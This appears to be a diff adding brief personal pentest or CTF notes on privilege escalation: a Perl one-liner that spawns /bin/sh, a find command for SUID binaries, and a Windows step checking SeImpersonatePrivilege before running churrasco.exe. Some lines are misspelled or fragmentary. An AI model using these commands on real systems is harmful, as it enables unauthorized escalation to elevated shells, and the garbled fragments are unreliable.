@@ -1,0 +1,15 @@
+perl privilage escalation
+perl -e 'exec "/bin/sh";'
+
+
+SUID-bits
+find / -perm -u=s -type f 2>/dev/null
+
+sion
+windows old versions --
+check   ==>     whoami /priv
+               if  ==>  SeImpersonatePrivilege    --> enabled the use impersionate
+                         churrasco.exe  <command>              
+               
+               
+ 
